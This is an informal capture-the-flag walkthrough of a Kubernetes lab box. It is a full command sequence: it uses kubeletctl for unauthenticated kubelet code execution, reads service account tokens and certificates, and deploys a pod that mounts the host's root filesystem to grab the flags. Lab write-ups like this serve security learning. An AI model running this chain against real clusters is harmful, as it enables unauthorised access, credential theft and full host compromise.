this box apperently had kubernetes running on it


so install the tool kubeletctl
curl -LO https://github.com/cyberark/kubeletctl/releases/download/v1.7/kubeletctl_linux_amd64
chmod a+x ./kubeletctl_linux_amd64
sudo mv ./kubeletctl_linux_amd64 /usr/local/bin/kubeletctl

after installing we check what pods there are:
kubeletctl --server {boxip} pods

then check for an rce
kubeletctl --server {boxip} scan rce

one of the boxes was vulnerable:
kubeletctl --server {boxip} exec "id" -p {found_pod} -c {found_container}

kubeletctl --server {boxip} exec "ls /root" -p {found_pod} -c {found_container}
kubeletctl --server {boxip} exec "cat /root/user.txt" -p {found_pod} -c {found_container}


then getting the tokens and certs:
export token=$(kubeletctl --server {boxip} exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p {found_pod} -c {found_container})
kubeletctl --server {boxip} exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p {found_pod} -c {found_container} > crt
chmod 600 crt


with these we can setup our own box and mount the whole machine:

nano f.yaml
`apiVersion: v1
kind: Pod
metadata:
  name: nginxt
  namespace: default
spec:
  containers:
  - name: nginxt
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true`


kubectl --token=$token --certificate-authority=ca.crt --server=https://{boxip}:8443 get pods
kubectl --token=$token --certificate-authority=crt --server=https://{boxip}:8443 get pods
kubectl --token=$token --certificate-authority=crt --server=https://{boxip}:8443 auth can-i --list
nano f.yaml
kubectl --token=$token --certificate-authority=crt --server=https://{boxip}:8443 apply -f f.yaml
nano f.yaml
kubectl --token=$token --certificate-authority=crt --server=https://{boxip}:8443 apply -f f.yaml
kubectl --token=$token --certificate-authority=crt --server=https://{boxip}:8443 get pods

after its created we can exec into it:
kubeletctl --server {boxip} exec "cat /root/root" -p nginxt -c nginxt
kubeletctl --server {boxip} exec "cat /root/root/root.txt" -p nginxt -c nginxt